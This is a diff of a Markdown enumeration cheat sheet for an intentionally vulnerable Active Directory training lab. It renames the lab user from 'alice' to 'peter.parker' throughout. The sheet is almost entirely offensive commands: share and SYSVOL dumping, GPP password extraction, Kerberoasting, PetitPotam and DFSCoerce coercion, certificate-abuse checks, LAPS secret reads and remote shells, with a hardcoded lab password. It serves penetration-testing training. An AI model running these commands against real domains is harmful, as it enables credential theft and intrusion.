@@ -88,8 +88,8 @@ rpcclient -U "" -N 10.10.0.10
 ### ENUM-007 — SMB share inventory + ACL
 ```bash
 smbmap -H 10.10.0.10 -u '' -p ''
-smbmap -H 10.10.0.13 -u alice -p 'DVADlab2024!' -R PublicShare
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares
+smbmap -H 10.10.0.13 -u peter.parker -p 'DVADlab2024!' -R PublicShare
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares
 ```
 **Looks for:** `READ, WRITE` on shares you shouldn't write to, `Everyone:FullAccess`.
 **DVAD wired:** `\\file01\PublicShare` Everyone:F.
@@ -97,11 +97,11 @@ nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares
 ### ENUM-008 — SYSVOL / NETLOGON content
 **What it returns:** Group Policy, logon scripts, GPP cpasswords, mapped drives.
 ```bash
-smbclient //10.10.0.10/SYSVOL -U alice%DVADlab2024!
+smbclient //10.10.0.10/SYSVOL -U peter.parker%DVADlab2024!
 # inside: prompt OFF; recurse ON; mget *
 # Or:
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M gpp_password
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M gpp_autologin
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gpp_password
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gpp_autologin
 ```
 **Looks for:** `Groups.xml` with `cpassword=`, `.bat`/`.ps1` with `net use ... /user:`.
 **DVAD wired:** `Groups.xml` cpassword + `login.bat` cleartext + `map_backup.bat`.
@@ -144,9 +144,9 @@ impacket-rpcdump 10.10.0.10
 
 ### ENUM-011 — SMB enumeration with credentials
 ```bash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' \
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' \
     --users --groups --shares --pass-pol --loggedon-users --sessions --disks --local-groups
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M spider_plus -o READ_ONLY=False
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M spider_plus -o READ_ONLY=False
 ```
 **Looks for:** local admin on what hosts (`(Pwn3d!)` in nxc output), loggedon-users (Kerberoast targets), enabled accounts.
 
@@ -167,14 +167,14 @@ nxc smb 10.10.0.0/21 -M spooler
 ### ENUM-014 — EFSRPC reachability (PetitPotam gate)
 ```bash
 impacket-rpcdump 10.10.0.10 | grep -i efsr
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' attacker 10.10.0.10
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker 10.10.0.10
 nxc smb 10.10.0.0/21 -M petitpotam
 ```
 
 ### ENUM-015 — DFS Namespace coercion gate (DFSCoerce)
 ```bash
 nxc smb 10.10.0.10 -M dfscoerce
-python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local attacker 10.10.0.10
+python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local attacker 10.10.0.10
 ```
 
 ### ENUM-016 — WebClient (WebDAV) reachability (ShadowCoerce / Coerce → HTTP)
@@ -200,11 +200,11 @@ ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" "(objectclass=user)" cn
 ### ENUM-018 — Authenticated LDAP enumeration
 **Tools:** `ldapsearch`, `windapsearch`, `ldapdomaindump`, `nxc ldap`, `bloodhound-python`, `adidnsdump`.
 ```bash
-ldapdomaindump -u corp\\alice -p 'DVADlab2024!' 10.10.0.10
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' \
+ldapdomaindump -u corp\\peter.parker -p 'DVADlab2024!' 10.10.0.10
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
     --users --groups --asreproast asrep.txt --kerberoasting kerb.txt \
     --trusted-for-delegation --password-not-required --admin-count --gmsa --bloodhound --collection All
-windapsearch -d corp.local -u alice -p 'DVADlab2024!' --dc-ip 10.10.0.10 -m all
+windapsearch -d corp.local -u peter.parker -p 'DVADlab2024!' --dc-ip 10.10.0.10 -m all
 ```
 
 ### ENUM-019 — LDAP filters worth memorizing
@@ -232,8 +232,8 @@ windapsearch -d corp.local -u alice -p 'DVADlab2024!' --dc-ip 10.10.0.10 -m all
 
 ### ENUM-020 — Trusts + cross-domain principals
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-domains
-ldapsearch -x -H ldap://10.10.0.10 -D 'corp\alice' -w 'DVADlab2024!' \
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-domains
+ldapsearch -x -H ldap://10.10.0.10 -D 'corp\peter.parker' -w 'DVADlab2024!' \
     -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)"
 nltest /domain_trusts /v                       # from Windows
 ```
@@ -241,7 +241,7 @@ nltest /domain_trusts /v                       # from Windows
 
 ### ENUM-021 — BloodHound ingest (the big one)
 ```bash
-bloodhound-python -u alice -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
+bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
 # .json into BloodHound CE → "Shortest Paths to Domain Admins"
 # Add custom queries from BadBlood/Improvements repo:
 #  - Find Tier-0 users not in Protected Users
@@ -262,13 +262,13 @@ SOAPHound.exe -c cache.txt --bhdump -o bh-output
 ### ENUM-023 — Global Catalog (3268 / 3269)
 **What it returns:** forest-wide partial attribute index — useful for cross-domain enum from one DC.
 ```bash
-ldapsearch -x -H ldap://10.10.0.10:3268 -D 'corp\alice' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10:3268 -D 'corp\peter.parker' -w 'DVADlab2024!' \
     -b "" "(&(objectClass=user)(sAMAccountName=*adm*))"
 ```
 
 ### ENUM-024 — LDAP password policy + lockout
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --pass-pol
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --pass-pol
 ldapsearch ... -b "DC=corp,DC=local" "(objectClass=domain)" \
     minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration
 # Fine-grained:
@@ -279,7 +279,7 @@ ldapsearch ... -b "CN=Password Settings Container,CN=System,..." \
 ### ENUM-025 — ADIDNS records via LDAP
 **Tools:** `adidnsdump`, raw LDAP.
 ```bash
-adidnsdump -u corp\\alice -p 'DVADlab2024!' 10.10.0.10
+adidnsdump -u corp\\peter.parker -p 'DVADlab2024!' 10.10.0.10
 # Dump every DNS record in the AD-integrated zone, including ones not in zone transfer.
 ```
 **Forward to:** PER-030 ADIDNS time bomb.
@@ -300,14 +300,14 @@ kerbrute userenum -d corp.local --dc 10.10.0.10 \
 ### ENUM-027 — AS-REP roastable accounts (no creds)
 ```bash
 impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt -format hashcat
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --asreproast asrep.hashes
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hashes
 ```
 **Forward to:** CRED-002 / IA-006.
 
 ### ENUM-028 — Kerberoast SPN enumeration
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kerberoasting kerb.hashes
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kerberoasting kerb.hashes
 ```
 **Forward to:** CRED-001.
 
@@ -321,7 +321,7 @@ ldapsearch ... "(servicePrincipalName=*)" msDS-SupportedEncryptionTypes
 ### ENUM-030 — Delegation enumeration
 ```bash
 # Unconstrained (TRUSTED_FOR_DELEGATION):
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
 # Constrained (msDS-AllowedToDelegateTo):
 ldapsearch ... "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
 # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set):
@@ -338,7 +338,7 @@ sudo ntpdate 10.10.0.10
 
 ### ENUM-032 — Pre2k / disabled / locked-out / never-logged-on
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --password-not-required
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --password-not-required
 ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=32)"   # PASSWD_NOTREQD
 ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=2)"    # ACCOUNTDISABLE
 ldapsearch ... "(!(lastLogon=*))"                                  # never logged on
@@ -424,17 +424,17 @@ nikto -h http://10.10.0.12
 
 ### ENUM-042 — ADCS web enrollment
 ```bash
-curl -sk http://10.10.0.12/certsrv/ -u 'corp\alice:DVADlab2024!'
+curl -sk http://10.10.0.12/certsrv/ -u 'corp\peter.parker:DVADlab2024!'
 # returns "Microsoft Active Directory Certificate Services"
-nxc smb 10.10.0.12 -u alice -p 'DVADlab2024!' -M adcs
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+nxc smb 10.10.0.12 -u peter.parker -p 'DVADlab2024!' -M adcs
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
 ```
 **DVAD wired:** /certsrv with Basic + Windows auth, no EPA, HTTP only → **ESC8**.
 
 ### ENUM-043 — IIS WebDAV (PROPFIND)
 ```bash
 davtest -url http://10.10.0.12/
-curl -X PROPFIND -H "Depth: 1" http://10.10.0.12/ -u 'corp\alice:DVADlab2024!'
+curl -X PROPFIND -H "Depth: 1" http://10.10.0.12/ -u 'corp\peter.parker:DVADlab2024!'
 ```
 
 ### ENUM-044 — Web directory brute
@@ -465,9 +465,9 @@ python3 mssql-tcp-info.py 10.10.0.0/21       # broadcast probe
 
 ### ENUM-047 — Authenticated SQL enum
 ```bash
-nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' \
+nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' \
     --local-auth -q "SELECT name FROM sys.databases"
-mssqlclient.py corp/alice:'DVADlab2024!'@10.10.0.14 -windows-auth
+mssqlclient.py corp/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
 # inside:
 enum_db
 enum_links                          # linked servers (lateral!)
@@ -496,9 +496,9 @@ Invoke-SQLAudit -Verbose
 
 ### ENUM-050 — WinRM reachability
 ```bash
-nxc winrm 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-evil-winrm -i 10.10.0.10 -u alice -p 'DVADlab2024!'
-curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\alice:DVADlab2024!'
+nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!'
+curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\peter.parker:DVADlab2024!'
 ```
 **DVAD wired:** 5985 HTTP open everywhere with `AllowUnencrypted=true`, Basic + CredSSP.
 
@@ -509,8 +509,8 @@ curl -sk "http://10.10.0.10:5985/wsman" -u 'corp\alice:DVADlab2024!'
 ### ENUM-051 — RDP service + NLA + encryption
 ```bash
 nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.0.0/21
-rdesktop -u alice 10.10.0.100
-xfreerdp /v:10.10.0.100 /u:alice /p:'DVADlab2024!'
+rdesktop -u peter.parker 10.10.0.100
+xfreerdp /v:10.10.0.100 /u:peter.parker /p:'DVADlab2024!'
 ```
 **Looks for:** `NLA: No` → CVE-2019-0708 (BlueKeep) candidate, `CredSSP_Required: false`.
 
@@ -520,9 +520,9 @@ xfreerdp /v:10.10.0.100 /u:alice /p:'DVADlab2024!'
 
 ### ENUM-052 — WMI query (over DCOM 135 → dynamic)
 ```bash
-impacket-wmiexec corp/alice:'DVADlab2024!'@10.10.0.100
+impacket-wmiexec corp/peter.parker:'DVADlab2024!'@10.10.0.100
 # Or query without exec:
-impacket-wmiquery corp/alice:'DVADlab2024!'@10.10.0.100 \
+impacket-wmiquery corp/peter.parker:'DVADlab2024!'@10.10.0.100 \
     -namespace 'root/cimv2' 'SELECT * FROM Win32_Process'
 ```
 
@@ -551,9 +551,9 @@ snmp-check -c public 10.10.0.10
 
 ### ENUM-055 — All ESC checks at once
 ```bash
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
 # Without auth (if you have certificate name):
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -dc-only
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -dc-only
 ```
 **Looks for:** `ESC1` … `ESC16`, `Web Enrollment` URL, `User Specified SAN`, `Manager Approval = False`, `Authorized Signatures Required = 0`, `Enrollment Rights`, `Object Control Permissions`.
 
@@ -586,7 +586,7 @@ curl -sk "https://10.10.0.12/corp-CA-CA_CES_UsernamePassword/service.svc/CES"
 
 ### ENUM-059 — All GPOs + linked OUs
 ```bash
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M enum_gpp
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M enum_gpp
 # Or:
 ldapsearch ... -b "CN=Policies,CN=System,DC=corp,DC=local" "(objectClass=groupPolicyContainer)"
 # From Windows:
@@ -669,8 +669,8 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Co
 
 ### ENUM-069 — LAPS + gMSA enumeration
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M laps
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --gmsa
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --gmsa
 # LDAP:
 ldapsearch ... "(ms-Mcs-AdmPwd=*)" cn ms-Mcs-AdmPwd
 ldapsearch ... "(msDS-GroupMSAMembership=*)" sAMAccountName msDS-GroupMSAMembership
@@ -698,13 +698,13 @@ type "C:\Program Files (x86)\McAfee\Common Framework\SiteList.xml"
 Get-ADSyncConnectorRunStatus
 Get-ADSyncScheduler
 # Detect AAD Connect server: ldap (servicePrincipalName=MSOL_*)
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query \
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query \
     "(samaccountname=MSOL_*)" "sAMAccountName description"
 ```
 
 ### ENUM-072 — Office 365 tenant discovery (from Kali)
 ```bash
-curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=alice@corp.local&xml=1"
+curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=peter.parker@corp.local&xml=1"
 curl -s "https://login.microsoftonline.com/corp.local/.well-known/openid-configuration"
 ```
 
@@ -787,9 +787,9 @@ curl -sk http://10.10.0.12/certsrv/
 If you found a credential along the way (AS-REP crack, SYSVOL cpassword, anon LDAP user attribute leak, sprayed password), pivot immediately into **authenticated** enum:
 
 ```bash
-nxc smb,ldap,mssql,winrm,rdp 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-bloodhound-python -u alice -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+nxc smb,ldap,mssql,winrm,rdp 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
 ```
 
 ---
